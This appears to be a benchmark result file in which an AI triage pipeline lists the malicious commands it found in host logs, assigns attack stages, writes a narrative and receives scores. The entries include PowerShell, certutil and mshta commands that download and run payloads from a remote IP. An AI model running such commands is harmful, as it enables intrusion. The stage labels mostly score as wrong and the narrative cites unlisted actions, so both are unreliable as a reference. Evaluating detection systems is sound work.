@@ -1,0 +1,247 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "C:\buttons.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test.hta ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test.hta ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test.hta ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test.hta ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Copy-Item '.\\.msxsl.exe' 'c:\\Windows\\Temp\\.msxsl.exe'",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\chromeRemoteServices.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\chromeRemoteServices.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\chromeRemoteServices.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\chromeRemoteServices.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\chromeRemoteServices.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\chromeRemoteServices.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\chromeRemoteServices.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\chromeRemoteServices.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\chromeRemoteServices.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\chromeRemoteServices.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powercfg.exe /requests",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powercfg.exe /energy",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powercfg.exe /batteryreport",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powercfg.exe /sleepstudy",
+        "stage": "Discovery"
+      },
+      {
+        "command": "net share",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "net view",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "net session",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "net use ",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "net config workstation",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "netstat -an",
+        "stage": "Collection"
+      },
+      {
+        "command": "arp -a",
+        "stage": "Collection"
+      },
+      {
+        "command": "ipconfig /all",
+        "stage": "Collection"
+      },
+      {
+        "command": "whoami",
+        "stage": "Collection"
+      },
+      {
+        "command": "systeminfo",
+        "stage": "Collection"
+      },
+      {
+        "command": "notepad.exe",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\Invoke-PSImage.ps1",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powercfg.exe /shutdown",
+        "stage": "Privilege Escalation"
+      }
+    ],
+    "narrative": "The malicious actor appears to be using multiple techniques to gain access and maintain persistence within the target machine. The actor has been observed using PowerShell scripts to execute remote commands, download additional tools, and evade detection. They have also made changes to registry keys to enable debuggers on specific processes, further evading detection. Additionally, the actor has created new shortcuts on the user\u2019s desktop, suggesting an attempt to spread laterally within the organization.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 167735,
+      "completion_tokens": 5925,
+      "total_tokens": 173660,
+      "wall_clock_s": 59.121,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.32653061224489793,
+      "recall": 0.5925925925925926,
+      "f1": 0.42105263157894735,
+      "tp": 16,
+      "fp": 33,
+      "fn": 11
+    },
+    "stage": {
+      "precision": 0.02040816326530612,
+      "recall": 0.07142857142857142,
+      "f1": 0.031746031746031744,
+      "tp": 1,
+      "fp": 48,
+      "fn": 13,
+      "recall_partial": 0.14285714285714285
+    },
+    "hallucination_rate": 0.15384615384615385,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 167735,
+      "completion_tokens": 5925,
+      "total_tokens": 173660,
+      "wall_clock_s": 59.121,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
